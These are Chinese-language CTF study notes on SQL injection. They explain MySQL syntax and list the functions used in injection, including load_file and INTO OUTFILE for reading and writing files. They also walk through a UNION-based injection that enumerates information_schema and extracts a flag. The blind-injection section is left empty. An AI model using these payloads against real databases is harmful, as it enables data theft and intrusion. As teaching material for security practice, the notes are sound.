# CTF Web笔记

## SQL注入

### 基本概念（摘抄自CTFwiki）

- SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。
- 攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。
- 如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。

### MySQL基础

- **基础指令**

```SQL
SHOW DATABASES;  /*输出所有的数据库*/

USE db_name;  /*使用某个其中一个数据库*/

SHOW TABLES;  /*显示数据库中的表*/

SHOW COLUMNS FROM table_name;  /*输出列*/
```

- **查询指令**

```SQL
SELECT field1, field2,...fieldN (FROM table_name1, table_name2..
[WHERE condition1 [AND [OR]] condition2...])
```
从table_name表中查询条件符合condition的field列中的元素

field可以替换为*，代指所有列

一些常用的查询语句

```SQL
SELECT col_name FROM table_name /*从特定表中获取特定列*/

SELECT * FROM table_name /*从特定表中获取全部列*/

SELECT * FROM table_name WHERE col_name = XXX /*在限定条件下取数据*/ 

SELECT * FROM table_name ORDER BY col_name(col_index) /*根据列名或索引排序*/

SELECT col_name1, col_name2… FROM table_name LIMIT N, M  /*从第N(从0开始)条开始，返回M条数据*/

SELECT col_name1, col_name2… FROM table_name LIMIT M OFFSET N  /*也可以这么写*/

SELECT concat(col_name1, col_name2…) FROM table_name /*整合列数据*/

SELECT group_concat(col_name1, col_name2…) FROM table_name /*整合行、列数据*/
```

- **注释方式**

```SQL
/*
这是注释，支持多行
*/

-- 这也是注释(注意后面有个空格)

# 这还是注释 

/*!version_number 当数据库版本大于version_number(或version_number为空)时
注释内容会被执行，否则就是普通注释*/
```

- **注入常用函数**

```SQL
SELECT user(); /* 获取当前数据库用户 */

SELECT database(); /* 获取当前数据库名 */

SELECT schema_name FROM information_schema.schemata; /*查询默认库得到所有数据库名*/

SELECT table_name FROM information_schema.tables WHERE table_schema='db_name'; /*查询数据库下的所有表名*/

SELECT column_name FROM information_schema.columns WHERE table_name='table_name' AND table_schema='db_name'; /*查询表中的所有列名*/

SELECT version(); /* 获取当前使用的数据库版本 */

SELECT @@datadir; /* 获取数据库存储数据的路径 */

SELECT concat_ws('分隔符', col_name1, col_name2...) FROM table_name; /* 使用 concat_ws() 联合列数据，并指定分隔符 */

SELECT hex(col_name) FROM table_name; /* 使用 hex() 进行编码 */

SELECT unhex(hex_col_name) FROM table_name; /* 使用 unhex() 进行解码 */

SELECT load_file('文件路径'); /* 使用 load_file() 以文本方式读取文件，路径在 Windows 中设置为 \ */

SELECT '数据内容' INTO OUTFILE '文件路径'; /* 在具有高权限时，将数据内容写入文件 */

ASCII() /*得到字符ASCII码值*/

CHAR() /*把ASCII码值转化为对应的字符*/
```

### 有回显的SQL注入

有回显即可以看到查询出的所有内容。

最简单的可被注入的语句有以下两种

```SQL
SELECT col_name(…) FROM table_name WHERE id = {}       /*数字型*/
SELECT col_name(…) FROM table_name WHERE id = '{}'     /*字符型*/
/* {}替换为输入的内容 */
```

除此之外还可能有括号，双引号等

所以首先就要判断是字符型查询还是数字型或是其他

首先传入所有特殊符号'"~!@#$%^&*()`，如果报错大概率是字符型

比如对于 `SELECT col_name(…) FROM table_name WHERE id = '{}'`,我们可以输入一个单引号，使其变成 `SELECT col_name(…) FROM table_name WHERE id = '''`,这样就会多出来一个单引号引发报错。

此外，还可以通过输入一个数学表达式如1+1，如果查询时发现式子被计算了，则是数字型。

确定查询语句后，就可以开始注入。

因为可以直接看到注入的回显，我们可以使用union语句查询自己想要的内容

```SQL
SELECT field1, …, fieldN FROM table_name UNION SELECT field1*, …, fieldN * FROM table_name*;
```

如传入`1' UNION SELECT {secret_data} # ` 组成 `SELECT col_name(…) FROM table_name WHERE id = '1' UNION SELECT {secret_data} # '`

注意，UNION语句前后查询的列数应当是一样的，否则会报错。

我们可以尝试构造
```sql
SELECT col_name1, …, col_nameN FROM table_name WHERE id = 1 ORDER BY M;
```

即将查询到的内容按第M列排序

- M<=N时，能有正常的返回

- M>N时，报错

然后我们就可以使用UNION查询其他的表，通过使用以下函数获得表名/列名

```sql
SELECT database(); /* 获取当前数据库名 */

SELECT schema_name FROM information_schema.schemata; /*查询默认库得到所有数据库名*/

SELECT table_name FROM information_schema.tables WHERE table_schema='db_name'; /*查询数据库下的所有表名*/

SELECT column_name FROM information_schema.columns WHERE table_name='table_name' AND table_schema='db_name'; /*查询表中的所有列名*/
```

例如构造如下查询指令进行查询

```sql
SELECT col_name1, …, col_nameN FROM table_name WHERE id = 3 UNION SELECT group_concat(schema_name), 2, 3 FROM information_schema.schemata;
```

假设我们发现了flag表，就可以构造注入语句。

如果查出users表中有三列，而flag表中只有一列，我们可以添加几个数字来凑齐三列。

```sql
SELECT * FROM users WHERE id=1 UNION SELECT 1,2,group_concat(flag) FROM flag
```

得到

| id | user | password |
|----------|----------|----------|
| 1    | admin   | adminpass   |
| 1    | 2   | flag1{},flag2,others   |

这样就拿到了有效信息。

### 无回显的SQL注入

无回显即不显示查询到的内容，一般返回是否查询到内容。

可以通过**布尔盲注**进行查询：



## 杂项知识
